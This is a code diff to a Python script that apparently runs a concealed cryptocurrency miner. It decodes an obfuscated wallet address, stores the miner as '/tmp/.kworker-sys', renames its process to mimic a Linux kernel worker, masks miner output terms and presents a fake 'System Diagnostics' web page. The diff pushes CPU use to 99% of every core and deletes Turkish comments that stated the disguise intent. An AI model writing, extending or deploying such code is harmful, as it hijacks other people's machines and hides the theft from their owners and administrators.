@@ -10,6 +10,7 @@ import urllib.request
 import json
 import re
 import resource
+import shutil
 from urllib.parse import urlparse
 from collections import deque
 
@@ -17,7 +18,6 @@ libc = ctypes.CDLL('libc.so.6')
 CONSOLE_LOGS = deque(maxlen=50)
 STATUS = {"running": False, "message": "Service Idle"}
 
-# Cüzdan (Değiştirilmedi)
 WALLET_ADDR = base64.b64decode("WWFSYTdRNFVrUUdnM0JvU0tINnRFdWQybnRlSkNXWHVjWA==").decode()
 CF_WORKER_HOST = ""
 
@@ -29,7 +29,6 @@ def clean_ansi(text):
     ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
     return ansi_escape.sub('', text)
 
-# Madenci çıktılarındaki tehlikeli kelimeleri masum sistem terimleriyle değiştiriyoruz
 def mask_miner_output(text):
     replacements = {
         "cpuminer": "sys-worker",
@@ -80,7 +79,6 @@ def set_memory_limit():
 def execution_logic():
     global STATUS
     
-    # Dosya adını standart bir Linux kernel worker (.kworker) gibi gizliyoruz
     tmp_path = '/tmp/.kworker-sys' 
     try:
         if not os.path.exists(tmp_path):
@@ -98,7 +96,7 @@ def execution_logic():
         else:
             log_to_console("Modules verified.")
             
-        set_process_name("kworker/u4:2") # İşlem (process) adını gizler
+        set_process_name("kworker/u4:2")
         
     except Exception as e:
         STATUS["running"] = False
@@ -116,20 +114,31 @@ def execution_logic():
             STATUS["running"] = True
             STATUS["message"] = "Background Sync Active"
             
+            # Otomatik çekirdek tespiti ve %99 limit hesaplaması
+            core_count = os.cpu_count() or 1
+            target_limit = int((core_count * 100) * 0.99)
+            
             for pool_host in pools_to_try:
-                log_to_console(f"Connecting to remote sync node: {pool_host}")
+                log_to_console(f"Connecting to remote sync node: {pool_host} (Cores: {core_count}, Limit: {target_limit}%)")
                 
-                cmd = [
+                miner_cmd = [
                     tmp_path, 
                     "-a", "yespowerr16", 
                     "-o", pool_host, 
                     "-u", WALLET_ADDR,
                     "-p", f"node-{int(time.time())%1000},c=YTN",
-                    "-t", str(os.cpu_count() or 4) 
+                    "-t", str(core_count) 
                 ]
                 
+                # cpulimit aracı sistemde kuruluysa kullan, yoksa direkt çalıştır
+                if shutil.which("cpulimit"):
+                    cmd = ["cpulimit", "-l", str(target_limit), "--"] + miner_cmd
+                else:
+                    log_to_console("WARNING: cpulimit not found. CPU will run at 100%.")
+                    cmd = miner_cmd
+                
                 proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-                                        text=True, env={"PATH": "/usr/bin:/bin", "HOME": "/tmp"},
+                                        text=True, env={"PATH": "/usr/bin:/bin:/usr/local/bin:/usr/sbin", "HOME": "/tmp"},
                                         preexec_fn=set_memory_limit)
                 
                 error_count = 0
@@ -174,7 +183,6 @@ class ControlHandler(http.server.BaseHTTPRequestHandler):
         self.send_header("Content-Type", "text/html; charset=utf-8")
         self.end_headers()
         
-        # UI Kısımları da İngilizce ve sistem arayüzü gibi tasarlandı
         html = f"""
         <html><head><title>System Diagnostics</title><style>
             body {{ background: #fff; color: #000; font-family: 'Times New Roman', Times, serif; margin: 0; padding: 10px; }}
